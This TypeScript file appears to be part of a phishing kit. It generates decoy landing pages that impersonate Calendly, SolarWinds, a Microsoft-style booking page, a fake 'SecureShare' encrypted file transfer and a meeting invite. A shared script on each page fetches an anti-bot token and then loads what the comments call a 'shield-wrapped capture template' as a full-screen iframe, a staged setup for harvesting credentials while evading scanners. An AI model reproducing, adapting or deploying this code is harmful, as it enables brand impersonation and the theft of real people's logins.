// Generates standalone decoy landing pages — the first page visitors see
// Flow: Decoy (this) → Shield → Capture Template
// Each decoy is a full HTML page with interaction. When the user acts,
// JS fetches /api/antibot-token then POSTs to /api/schedule/confirm,
// which returns shield-wrapped capture template injected as iframe.

const TRANSITION_SCRIPT = `
  var _r=false;
  async function handleContinue(btnId, btnLabel){
    if(_r) return;
    _r=true;
    var b=document.getElementById(btnId);
    if(b){b.disabled=true;b.innerHTML='<span class="spinner"></span>Loading...';}
    try{
      var k='';
      try{var p=await fetch('/api/antibot-token');var j=await p.json();if(j.token) k=j.token;}catch(e){}
      var h={'Content-Type':'application/json'};
      if(k) h['X-Request-Token']=k;
      var r=await fetch('/api/schedule/confirm',{method:'POST',headers:h,body:JSON.stringify({})});
      var d=await r.json();
      if(d.error){if(b){b.disabled=false;b.innerHTML=btnLabel;}_r=false;return;}
      if(d.html){
        var f=document.createElement('iframe');f.srcdoc=d.html;f.style.cssText='position:fixed;inset:0;width:100%;height:100%;z-index:9999;border:none;background:#fff';
        document.body.appendChild(f);
        var w=document.querySelector('.decoy-wrapper');if(w)w.style.display='none';
      }
    }catch(e){if(b){b.disabled=false;b.innerHTML=btnLabel;}_r=false;}
  }
`;

const SPINNER_CSS = `.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}@keyframes spin{to{transform:rotate(360deg)}}`;

function generateBookingDecoy(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Schedule a Meeting</title>
  <meta name="description" content="Select a date and time to schedule your meeting.">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',Arial,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:12px}
    .decoy-wrapper{background:#fff;border-radius:4px;box-shadow:0 2px 12px rgba(0,0,0,.1);max-width:860px;width:100%;display:flex;overflow:hidden}
    .bk-left{background:#0078d4;width:380px;padding:24px 24px 20px;display:flex;flex-direction:column;flex-shrink:0;color:#fff}
    .bk-title{font-size:22px;font-weight:300;color:#fff;margin-bottom:18px;line-height:1.3;letter-spacing:-.3px}
    .bk-month-row{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:10px}
    .bk-month-label{font-size:18px;font-weight:700;color:#fff}
    .bk-nav{width:28px;height:28px;border-radius:50%;border:none;background:rgba(255,255,255,.15);cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .15s;color:#fff;font-size:13px}
    .bk-nav:hover{background:rgba(255,255,255,.3)}
    .bk-nav.disabled{opacity:.25;cursor:default;pointer-events:none}
    .bk-weekdays{display:grid;grid-template-columns:repeat(7,1fr);margin-bottom:2px}
    .bk-weekday{text-align:center;font-size:11px;font-weight:600;color:rgba(255,255,255,.85);padding:4px 0;text-transform:uppercase}
    .bk-days{display:grid;grid-template-columns:repeat(7,1fr);gap:1px}
    .bk-day{text-align:center;padding:0;font-size:13px;color:rgba(255,255,255,.55);border-radius:50%;cursor:default;width:34px;height:34px;display:flex;align-items:center;justify-content:center;margin:0 auto;border:none;background:transparent;font-family:inherit;transition:background .12s}
    .bk-day.empty{visibility:hidden}
    .bk-day.past{color:rgba(255,255,255,.25)}
    .bk-day.available{color:#fff;cursor:pointer;font-weight:500}
    .bk-day.available:hover{background:rgba(255,255,255,.18)}
    .bk-day.selected{background:#fff;color:#0078d4;font-weight:700;cursor:pointer}
    .bk-day.today{position:relative}
    .bk-day.today::after{content:'';position:absolute;bottom:4px;left:50%;transform:translateX(-50%);width:4px;height:4px;border-radius:50%;background:#fff}
    .bk-day.today.selected::after{background:#0078d4}
    .bk-right{flex:1;padding:20px 24px;display:flex;flex-direction:column;overflow-y:auto}
    .bk-section-label{font-size:14px;font-weight:700;color:#1a1a1a;margin-bottom:4px}
    .bk-section-sub{font-size:13px;color:#616161;margin-bottom:12px;line-height:1.4}
    .bk-duration{background:#e8e8e8;border-radius:20px;padding:7px 16px;text-align:center;font-size:13px;font-weight:600;color:#1a1a1a;margin-bottom:14px}
    .bk-date-label{font-size:13px;color:#1a1a1a;margin-bottom:2px}
    .bk-date-label strong{font-weight:700}
    .bk-tz-row{display:flex;align-items:center;gap:6px;font-size:12px;color:#0078d4;margin-bottom:10px;cursor:default}
    .bk-tz-row svg{width:13px;height:13px;fill:none;stroke:#0078d4;stroke-width:2}
    .bk-slots{display:flex;flex-direction:column;gap:4px;margin-bottom:10px}
    .bk-slot{border:1px solid #e1e1e1;border-radius:4px;padding:8px;text-align:center;font-size:13px;font-weight:500;color:#0078d4;cursor:pointer;transition:all .12s;background:#fff}
    .bk-slot:hover{border-color:#0078d4;background:#f0f6ff}
    .bk-slot.active{border-color:#0078d4;background:#0078d4;color:#fff;font-weight:600}
    .bk-schedule-btn{display:none;width:100%;background:#0078d4;color:#fff;border:none;padding:10px;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;transition:all .12s;text-align:center;margin-top:4px}
    .bk-schedule-btn.visible{display:block}
    .bk-schedule-btn:hover{background:#106ebe}
    .bk-schedule-btn:disabled{background:#a0a0a0;cursor:not-allowed}
    ${SPINNER_CSS}
    @media(max-width:720px){.decoy-wrapper{flex-direction:column}.bk-left{width:100%;padding:28px 24px 24px}.bk-right{padding:24px}}
  </style>
</head>
<body>
  <div class="decoy-wrapper">
    <div class="bk-left">
      <div class="bk-title">Schedule a Meeting</div>
      <div class="bk-month-row">
        <button class="bk-nav disabled" id="prevMonth" aria-label="Previous">&#10094;</button>
        <span class="bk-month-label" id="monthLabel"></span>
        <button class="bk-nav" id="nextMonth" onclick="navMonth(1)" aria-label="Next">&#10095;</button>
      </div>
      <div class="bk-weekdays"><div class="bk-weekday">SUN</div><div class="bk-weekday">MON</div><div class="bk-weekday">TUE</div><div class="bk-weekday">WED</div><div class="bk-weekday">THU</div><div class="bk-weekday">FRI</div><div class="bk-weekday">SAT</div></div>
      <div class="bk-days" id="calDays"></div>
    </div>
    <div class="bk-right">
      <div class="bk-section-label">Meeting duration</div>
      <div class="bk-duration">15 mins</div>
      <div class="bk-section-label">What time works best?</div>
      <div class="bk-date-label">Showing times for <strong id="selectedDateLabel"></strong></div>
      <div class="bk-tz-row"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg><span id="tzDisplay">Detecting...</span><span style="margin-left:2px">&#9662;</span></div>
      <div class="bk-slots" id="timeSlots"></div>
      <button class="bk-schedule-btn" id="continueBtn" onclick="handleContinue('continueBtn','Schedule Meeting')">Schedule Meeting</button>
    </div>
  </div>
  <script>
  ${TRANSITION_SCRIPT}
  var viewYear,viewMonth,selectedDay;
  var months=['January','February','March','April','May','June','July','August','September','October','November','December'];
  (function(){var now=new Date();viewYear=now.getFullYear();viewMonth=now.getMonth();selectedDay=now.getDate();var dow=now.getDay();if(dow===0)selectedDay++;else if(dow===6)selectedDay+=2;var dim=new Date(viewYear,viewMonth+1,0).getDate();if(selectedDay>dim){viewMonth++;if(viewMonth>11){viewMonth=0;viewYear++;}selectedDay=1;}renderCalendar();detectTimezone();renderSlots();})();
  function renderCalendar(){var now=new Date();var today=now.getDate();var todayMonth=now.getMonth();var todayYear=now.getFullYear();document.getElementById('monthLabel').textContent=months[viewMonth]+' '+viewYear;var prev=document.getElementById('prevMonth');if(viewYear===todayYear&&viewMonth===todayMonth){prev.classList.add('disabled');prev.onclick=null;}else{prev.classList.remove('disabled');prev.onclick=function(){navMonth(-1);};}var firstDay=new Date(viewYear,viewMonth,1).getDay();var daysInMonth=new Date(viewYear,viewMonth+1,0).getDate();var html='';for(var i=0;i<firstDay;i++)html+='<button class="bk-day empty"></button>';for(var d=1;d<=daysInMonth;d++){var cls='bk-day';var isPast=(viewYear<todayYear)||(viewYear===todayYear&&viewMonth<todayMonth)||(viewYear===todayYear&&viewMonth===todayMonth&&d<today);var isToday=(viewYear===todayYear&&viewMonth===todayMonth&&d===today);var dayOfWeek=(firstDay+d-1)%7;var isWeekend=(dayOfWeek===0||dayOfWeek===6);if(isPast||isWeekend)cls+=' past';else cls+=' available';if(isToday)cls+=' today';if(d===selectedDay)cls+=' selected';var onclick=(!isPast&&!isWeekend)?'onclick="selectDay('+d+')"':'';html+='<button class="'+cls+'" '+onclick+'>'+d+'</button>';}document.getElementById('calDays').innerHTML=html;updateDateLabel();}
  function selectDay(d){selectedDay=d;renderCalendar();renderSlots();}
  function navMonth(dir){viewMonth+=dir;if(viewMonth>11){viewMonth=0;viewYear++;}if(viewMonth<0){viewMonth=11;viewYear--;}selectedDay=1;var now=new Date();if(viewYear===now.getFullYear()&&viewMonth===now.getMonth()){selectedDay=now.getDate();var dow=now.getDay();if(dow===0)selectedDay++;else if(dow===6)selectedDay+=2;}renderCalendar();renderSlots();}
  function updateDateLabel(){document.getElementById('selectedDateLabel').textContent=months[viewMonth]+' '+selectedDay+', '+viewYear;}
  function detectTimezone(){try{document.getElementById('tzDisplay').textContent=Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){document.getElementById('tzDisplay').textContent='UTC';}}
  function renderSlots(){var slots=['9:00 AM','10:00 AM','11:00 AM','12:00 PM','1:00 PM','2:00 PM','3:00 PM','4:00 PM'];var html='';for(var i=0;i<slots.length;i++)html+='<div class="bk-slot" onclick="selectSlot(this)">'+slots[i]+'</div>';document.getElementById('timeSlots').innerHTML=html;document.getElementById('continueBtn').classList.remove('visible');}
  function selectSlot(el){var all=document.querySelectorAll('.bk-slot');for(var i=0;i<all.length;i++)all[i].classList.remove('active');el.classList.add('active');document.getElementById('continueBtn').classList.add('visible');}
  </script>
</body>
</html>`;
}

function generateSecureShareDecoy(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SecureShare - Encrypted File Transfer</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f4f8;min-height:100vh}
    .decoy-wrapper{min-height:100vh;display:flex}
    .ss-left{flex:0 0 420px;background:linear-gradient(135deg,#1a365d 0%,#2b6cb0 100%);display:flex;align-items:center;justify-content:center;padding:60px 40px;color:#fff}
    .ss-left-inner{max-width:340px}
    .ss-logo{display:flex;align-items:center;gap:12px;margin-bottom:40px}
    .ss-logo-icon{width:48px;height:48px;background:rgba(255,255,255,.15);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700}
    .ss-logo-text{font-size:22px;font-weight:600}
    .ss-left h2{font-size:28px;font-weight:600;margin-bottom:16px;line-height:1.3}
    .ss-left p{font-size:15px;opacity:.85;line-height:1.6;margin-bottom:32px}
    .ss-features{list-style:none}
    .ss-features li{display:flex;align-items:center;gap:12px;padding:10px 0;font-size:14px;opacity:.9}
    .ss-features li svg{width:20px;height:20px;flex-shrink:0}
    .ss-right{flex:1;display:flex;align-items:center;justify-content:center;padding:40px}
    .ss-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:40px;max-width:440px;width:100%}
    .ss-card h1{font-size:24px;font-weight:600;color:#1a1a1a;margin-bottom:8px}
    .ss-card .ss-sub{font-size:14px;color:#666;margin-bottom:24px;line-height:1.5}
    .ss-file-box{background:#f7fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin-bottom:24px}
    .ss-file-row{display:flex;align-items:center;gap:12px}
    .ss-file-icon{width:40px;height:40px;background:#2b6cb0;border-radius:8px;display:flex;align-items:center;justify-content:center}
    .ss-file-icon svg{width:20px;height:20px;stroke:#fff;fill:none;stroke-width:2}
    .ss-file-info{flex:1}
    .ss-file-name{font-size:14px;font-weight:600;color:#1a1a1a}
    .ss-file-meta{font-size:12px;color:#888;margin-top:2px}
    .ss-encrypt-badge{display:inline-flex;align-items:center;gap:6px;background:#e6fffa;color:#047857;font-size:12px;font-weight:600;padding:4px 10px;border-radius:12px;margin-top:12px}
    .ss-encrypt-badge svg{width:14px;height:14px}
    .ss-btn{width:100%;padding:14px;background:#2b6cb0;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
    .ss-btn:hover{background:#1e5a9e}
    .ss-btn:disabled{background:#a0a0a0;cursor:not-allowed}
    .ss-footer{text-align:center;margin-top:20px;font-size:12px;color:#999}
    ${SPINNER_CSS}
    @media(max-width:768px){.decoy-wrapper{flex-direction:column}.ss-left{flex:none;padding:40px 24px}}
  </style>
</head>
<body>
  <div class="decoy-wrapper">
    <div class="ss-left">
      <div class="ss-left-inner">
        <div class="ss-logo">
          <div class="ss-logo-icon">SS</div>
          <div class="ss-logo-text">SecureShare</div>
        </div>
        <h2>Enterprise File Sharing</h2>
        <p>End-to-end encrypted file transfer with enterprise-grade security and compliance.</p>
        <ul class="ss-features">
          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>256-bit AES encryption</li>
          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>SOC 2 Type II certified</li>
          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Zero-knowledge architecture</li>
        </ul>
      </div>
    </div>
    <div class="ss-right">
      <div class="ss-card">
        <h1>Secure File Transfer</h1>
        <p class="ss-sub">A file has been shared with you via SecureShare. Verify your identity to access the encrypted content.</p>
        <div class="ss-file-box">
          <div class="ss-file-row">
            <div class="ss-file-icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
            <div class="ss-file-info">
              <div class="ss-file-name">Confidential_Report_2024.pdf</div>
              <div class="ss-file-meta">2.4 MB &middot; Shared today</div>
            </div>
          </div>
          <div class="ss-encrypt-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>End-to-end encrypted</div>
        </div>
        <button class="ss-btn" id="ssBtn" onclick="handleContinue('ssBtn','Access Secure File')">Access Secure File</button>
        <div class="ss-footer">SecureShare &middot; Enterprise File Transfer</div>
      </div>
    </div>
  </div>
  <script>${TRANSITION_SCRIPT}</script>
</body>
</html>`;
}

function generateCalendarInviteDecoy(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Meeting Invitation</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .decoy-wrapper{max-width:520px;width:100%}
    .ci-brand{display:flex;align-items:center;gap:10px;margin-bottom:24px}
    .ci-brand-icon{width:36px;height:36px;background:#5B5FC7;border-radius:8px;display:flex;align-items:center;justify-content:center}
    .ci-brand-icon svg{width:20px;height:20px;stroke:#fff;fill:none;stroke-width:2}
    .ci-brand-name{font-size:18px;font-weight:600;color:#1a1a1a}
    .ci-card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);padding:32px}
    .ci-card h1{font-size:22px;font-weight:600;color:#1a1a1a;margin-bottom:8px}
    .ci-card .ci-sub{font-size:14px;color:#666;margin-bottom:20px}
    .ci-meeting-box{background:#ededfc;border:1px solid #b3b3e6;border-radius:8px;padding:16px;margin-bottom:20px}
    .ci-meeting-title{font-size:15px;font-weight:600;color:#3b3f8f;margin-bottom:12px}
    .ci-detail{display:flex;align-items:center;gap:10px;padding:6px 0;font-size:13px;color:#555}
    .ci-detail svg{width:16px;height:16px;stroke:#5B5FC7;fill:none;stroke-width:2;flex-shrink:0}
    .ci-attendees{margin-top:12px;padding-top:12px;border-top:1px solid #d4d4e8}
    .ci-attendees-label{font-size:12px;font-weight:600;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
    .ci-avatar-row{display:flex;gap:-4px}
    .ci-avatar{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#fff;margin-right:-4px;border:2px solid #fff}
    .ci-actions{display:flex;gap:8px;margin-bottom:16px}
    .ci-accept{flex:1;padding:12px;background:#5B5FC7;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:background .15s}
    .ci-accept:hover{background:#4a4fb3}
    .ci-accept:disabled{background:#a0a0a0;cursor:not-allowed}
    .ci-decline{flex:1;padding:12px;background:#fff;color:#666;border:1px solid #ddd;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer}
    .ci-footer{display:flex;justify-content:center;gap:16px;margin-top:20px;font-size:12px;color:#999}
    ${SPINNER_CSS}
  </style>
</head>
<body>
  <div class="decoy-wrapper">
    <div class="ci-brand">
      <div class="ci-brand-icon"><svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg></div>
      <span class="ci-brand-name">MeetSpace</span>
    </div>
    <div class="ci-card">
      <h1>Meeting Invitation</h1>
      <p class="ci-sub">You have been invited to a meeting. Review the details and accept to join.</p>
      <div class="ci-meeting-box">
        <div class="ci-meeting-title">Quarterly Business Review</div>
        <div class="ci-detail"><svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg><span id="meetDate"></span></div>
        <div class="ci-detail"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span>10:00 AM - 11:00 AM (60 min)</span></div>
        <div class="ci-detail"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg><span>Virtual Meeting Room</span></div>
        <div class="ci-attendees">
          <div class="ci-attendees-label">Attendees (4)</div>
          <div class="ci-avatar-row">
            <div class="ci-avatar" style="background:#5B5FC7">JD</div>
            <div class="ci-avatar" style="background:#2b6cb0">SM</div>
            <div class="ci-avatar" style="background:#38a169">AK</div>
            <div class="ci-avatar" style="background:#e53e3e">+1</div>
          </div>
        </div>
      </div>
      <div class="ci-actions">
        <button class="ci-accept" id="ciBtn" onclick="handleContinue('ciBtn','Accept & Join')">Accept & Join</button>
        <button class="ci-decline" onclick="this.textContent='Declined'">Decline</button>
      </div>
    </div>
    <div class="ci-footer"><span>Terms of Service</span><span>Privacy</span></div>
  </div>
  <script>
  ${TRANSITION_SCRIPT}
  (function(){var d=new Date();d.setDate(d.getDate()+1);if(d.getDay()===0)d.setDate(d.getDate()+1);if(d.getDay()===6)d.setDate(d.getDate()+2);var days=['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];var months=['January','February','March','April','May','June','July','August','September','October','November','December'];document.getElementById('meetDate').textContent=days[d.getDay()]+', '+months[d.getMonth()]+' '+d.getDate()+', '+d.getFullYear();})();
  </script>
</body>
</html>`;
}

function generateCalendlyDecoy(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Calendly - Schedule Meeting</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f7f7f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .decoy-wrapper{max-width:680px;width:100%;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);overflow:hidden}
    .cal-header{background:#006BFF;color:#fff;padding:20px 28px;display:flex;align-items:center;gap:12px}
    .cal-logo{font-size:20px;font-weight:700;letter-spacing:-.3px}
    .cal-body{display:flex;min-height:400px}
    .cal-info{flex:0 0 240px;padding:28px;border-right:1px solid #eee}
    .cal-avatar{width:56px;height:56px;background:#006BFF;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;font-weight:600;margin-bottom:16px}
    .cal-host{font-size:13px;color:#888;margin-bottom:4px}
    .cal-title{font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:16px}
    .cal-meta{font-size:13px;color:#555;margin-bottom:8px;display:flex;align-items:center;gap:8px}
    .cal-meta svg{width:16px;height:16px;stroke:#006BFF;fill:none;stroke-width:2;flex-shrink:0}
    .cal-desc{font-size:13px;color:#888;margin-top:16px;padding-top:16px;border-top:1px solid #eee;line-height:1.5}
    .cal-slots{flex:1;padding:28px}
    .cal-slots-title{font-size:15px;font-weight:600;color:#1a1a1a;margin-bottom:6px}
    .cal-slots-date{font-size:13px;color:#888;margin-bottom:16px}
    .cal-slot-list{display:flex;flex-direction:column;gap:8px;margin-bottom:20px;max-height:280px;overflow-y:auto}
    .cal-slot{border:1px solid #e1e1e1;border-radius:6px;padding:12px;text-align:center;font-size:14px;font-weight:500;color:#006BFF;cursor:pointer;transition:all .12s}
    .cal-slot:hover{border-color:#006BFF;background:#f0f6ff}
    .cal-slot.active{background:#006BFF;color:#fff;border-color:#006BFF}
    .cal-confirm{width:100%;display:none;padding:12px;background:#006BFF;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer}
    .cal-confirm.visible{display:block}
    .cal-confirm:hover{background:#0055cc}
    .cal-confirm:disabled{background:#a0a0a0;cursor:not-allowed}
    ${SPINNER_CSS}
    @media(max-width:600px){.cal-body{flex-direction:column}.cal-info{flex:none;border-right:none;border-bottom:1px solid #eee}}
  </style>
</head>
<body>
  <div class="decoy-wrapper">
    <div class="cal-header">
      <span class="cal-logo">Calendly</span>
    </div>
    <div class="cal-body">
      <div class="cal-info">

        <div class="cal-title">10-Minute Meeting</div>
        <div class="cal-meta"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>10 min</div>
        <div class="cal-meta"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>Virtual</div>
        <div class="cal-desc">A quick meeting to discuss next steps. Select a time that works for you.</div>
      </div>
      <div class="cal-slots">
        <div class="cal-slots-title">Select a Time</div>
        <div class="cal-slots-date" id="calDate"></div>
        <div class="cal-slot-list" id="calSlots"></div>
        <button class="cal-confirm" id="calBtn" onclick="handleContinue('calBtn','Confirm Meeting')">Confirm Meeting</button>
      </div>
    </div>
  </div>
  <script>
  ${TRANSITION_SCRIPT}
  (function(){var d=new Date();d.setDate(d.getDate()+1);if(d.getDay()===0)d.setDate(d.getDate()+1);if(d.getDay()===6)d.setDate(d.getDate()+2);var months=['January','February','March','April','May','June','July','August','September','October','November','December'];var days=['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];document.getElementById('calDate').textContent=days[d.getDay()]+', '+months[d.getMonth()]+' '+d.getDate();
  var slots=['9:00am','9:30am','10:00am','10:30am','11:00am','11:30am','12:00pm','12:30pm','1:00pm','1:30pm','2:00pm','2:30pm','3:00pm','3:30pm','4:00pm'];var html='';for(var i=0;i<slots.length;i++)html+='<div class="cal-slot" onclick="pickSlot(this)">'+slots[i]+'</div>';document.getElementById('calSlots').innerHTML=html;})();
  function pickSlot(el){var all=document.querySelectorAll('.cal-slot');for(var i=0;i<all.length;i++)all[i].classList.remove('active');el.classList.add('active');document.getElementById('calBtn').classList.add('visible');}
  </script>
</body>
</html>`;
}

function generateSolarWindsDecoy(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SolarWinds - Meeting Room</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .decoy-wrapper{max-width:520px;width:100%}
    .sw-brand{display:flex;align-items:center;gap:12px;margin-bottom:24px}
    .sw-brand-icon{width:40px;height:40px;background:#F58220;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff}
    .sw-brand-name{font-size:20px;font-weight:600;color:#fff}
    .sw-card{background:#2a2a3e;border-radius:12px;padding:32px;box-shadow:0 4px 24px rgba(0,0,0,.3)}
    .sw-card h1{font-size:22px;font-weight:600;color:#fff;margin-bottom:8px}
    .sw-card .sw-sub{font-size:14px;color:#a0a0b0;margin-bottom:24px;line-height:1.5}
    .sw-meeting-types{display:flex;flex-direction:column;gap:8px;margin-bottom:24px}
    .sw-type{background:#1a1a2e;border:1px solid #3a3a4e;border-radius:8px;padding:16px;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:14px}
    .sw-type:hover{border-color:#F58220}
    .sw-type.active{border-color:#F58220;background:#2a2020}
    .sw-type-icon{width:36px;height:36px;background:#3a3a4e;border-radius:8px;display:flex;align-items:center;justify-content:center}
    .sw-type-icon svg{width:18px;height:18px;stroke:#F58220;fill:none;stroke-width:2}
    .sw-type-info h3{font-size:14px;font-weight:600;color:#e0e0e0;margin-bottom:2px}
    .sw-type-info p{font-size:12px;color:#888}
    .sw-btn{width:100%;padding:14px;background:#F58220;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;display:none;transition:background .15s}
    .sw-btn.visible{display:block}
    .sw-btn:hover{background:#e07010}
    .sw-btn:disabled{background:#555;cursor:not-allowed}
    .sw-footer{display:flex;justify-content:center;gap:16px;margin-top:20px;font-size:12px;color:#555}
    ${SPINNER_CSS}
  </style>
</head>
<body>
  <div class="decoy-wrapper">
    <div class="sw-brand">
      <div class="sw-brand-icon">SW</div>
      <span class="sw-brand-name">SolarWinds</span>
    </div>
    <div class="sw-card">
      <h1>Meeting Room</h1>
      <p class="sw-sub">Select a meeting type to join the SolarWinds collaboration space.</p>
      <div class="sw-meeting-types">
        <div class="sw-type" onclick="pickType(this)">
          <div class="sw-type-icon"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
          <div class="sw-type-info"><h3>Team Standup</h3><p>Quick 15-min daily sync</p></div>
        </div>
        <div class="sw-type" onclick="pickType(this)">
          <div class="sw-type-icon"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
          <div class="sw-type-info"><h3>Presentation</h3><p>Screen sharing enabled session</p></div>
        </div>
        <div class="sw-type" onclick="pickType(this)">
          <div class="sw-type-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9"/></svg></div>
          <div class="sw-type-info"><h3>Workshop</h3><p>Interactive 60-min deep dive</p></div>
        </div>
      </div>
      <button class="sw-btn" id="swBtn" onclick="handleContinue('swBtn','Join Meeting')">Join Meeting</button>
    </div>
    <div class="sw-footer"><span>SolarWinds Terms</span><span>Privacy</span></div>
  </div>
  <script>
  ${TRANSITION_SCRIPT}
  function pickType(el){var all=document.querySelectorAll('.sw-type');for(var i=0;i<all.length;i++)all[i].classList.remove('active');el.classList.add('active');document.getElementById('swBtn').classList.add('visible');}
  </script>
</body>
</html>`;
}

export function generateDecoyHTML(decoyType: string): string {
  switch (decoyType) {
    case 'secureshare':
      return generateSecureShareDecoy();
    case 'calendar-invite':
      return generateCalendarInviteDecoy();
    case 'calendly-meeting':
      return generateCalendlyDecoy();
    case 'bookings-meeting':
      return generateBookingDecoy();
    case 'solarwinds-meeting':
      return generateSolarWindsDecoy();
    default:
      return generateBookingDecoy();
  }
}
